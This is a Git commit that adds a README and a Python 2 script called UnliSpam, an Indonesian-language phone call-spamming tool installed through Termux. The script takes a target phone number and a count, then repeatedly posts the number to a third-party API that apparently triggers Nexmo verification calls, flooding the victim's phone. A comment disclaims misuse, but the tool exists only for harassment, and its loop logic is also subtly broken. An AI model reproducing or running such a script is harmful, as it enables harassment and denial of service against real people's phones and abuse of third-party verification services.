186edd8d8b883ba5c8f4c44306c15d48de461bf8
bangnaga1 <44352498+bangnaga1@users.noreply.github.com>
2019-01-29 12:53:31 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,22 @@
+# UnliSpam
+SPAMCALL v1.0 UNLIMITED
+ 
+ Installer
+ SpamCall UNLIMITED v1.0  Work 100%
+
+
++++++++++++ INSTALLER ++++++++++++
+
+
+<li> $ pkg update 
+<li> $ pkg upgrade
+<li> $ pkg install php
+<li> $ pkg install git
+<li> $ git clone https://github.com/Bangnaga1/UnliSpam
+<li> $ pkg install python2
+<li> $ pip2 install requests 
+<li> $ pkg install vim
+<li> $ cd UnliSpam
+<li> $ ls
+<li>$ python2 call.py
+<li>#Done....
---
+++ call.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#SpamCall UNLIMITED
+#Tolong jangan disalahgukan,,resiko tanggung sendiri
+# Bang Naga
+
+import requests,json,time,subprocess
+import os, time
+import subprocess as sp
+
+subprocess.call("clear", shell=True)
+
+banner = """\033[0;32m
+ =======================================
+ ___  _                      _
+|  _ \| |__  _ __ ___  __ _| | _____ _ __
+| |_) | '_ \| '__/ _ \/ _` | |/ / _ \ '__|
+|  __/| | | | | |  __/ (_| |   <  __/ |
+|_|   |_| |_|_|  \___|\__,_|_|\_\___|_|
+
+\033[1;34mCalling SPAM\033[1;36m UNLIMITED\033[0;32m
+ =======================================
+"""
+
+x = 0
+print banner
+a = raw_input("[+] Lanjutkan (y/n): ")
+s = raw_input("[+] Nomor Target : ")
+d = raw_input("[+] Jumlah : ")
+while x < d:
+   b = {"https://xxnx.com":a}
+   c = " https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor="
+   e = requests.post(c+s, data=b)
+   f = json.loads(e.text)
+   if "nexmo_request_id" in f:
+       print "033[1;36m[+] SUCESS WITH ID",f["nexmo_request_id"]
+   else:
+       print "033[1;36m[+] Spam Succes"
+         
